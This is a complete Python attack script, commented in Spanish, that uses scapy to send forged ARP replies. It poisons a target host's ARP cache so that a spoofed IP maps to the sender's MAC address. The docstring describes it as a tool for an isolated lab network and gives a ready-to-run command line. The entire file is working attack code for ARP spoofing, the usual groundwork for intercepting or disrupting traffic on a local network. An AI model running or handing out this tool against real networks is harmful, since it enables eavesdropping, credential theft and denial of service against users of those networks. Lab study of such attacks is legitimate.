#!/usr/bin/env python3
"""Envía ARP replies falsos en una red de laboratorio aislada.

Uso:
  sudo python3 arp-spoof.py --iface enp0s10 --target-ip 10.0.3.12 \
      --target-mac 08:00:27:d1:03:ae --spoof-ip 10.0.3.11 --count 10
"""
import argparse
from scapy.all import ARP, Ether, get_if_hwaddr, sendp

p = argparse.ArgumentParser()
p.add_argument("--iface", default="enp0s10")
p.add_argument("--target-ip", required=True)
p.add_argument("--target-mac", required=True)
p.add_argument("--spoof-ip", required=True)
p.add_argument("--spoof-mac", default=None)
p.add_argument("--count", type=int, default=10)
p.add_argument("--interval", type=float, default=1.0)
a = p.parse_args()

spoof_mac = a.spoof_mac or get_if_hwaddr(a.iface)
pkt = (
    Ether(dst=a.target_mac, src=spoof_mac)
    / ARP(
        op=2,
        hwsrc=spoof_mac,
        psrc=a.spoof_ip,
        hwdst=a.target_mac,
        pdst=a.target_ip,
    )
)
print(f"ARP spoof: {a.spoof_ip} -> {spoof_mac} hacia {a.target_ip} ({a.target_mac}) por {a.iface}")
sendp(pkt, iface=a.iface, count=a.count, inter=a.interval, verbose=False)
print("Hecho")
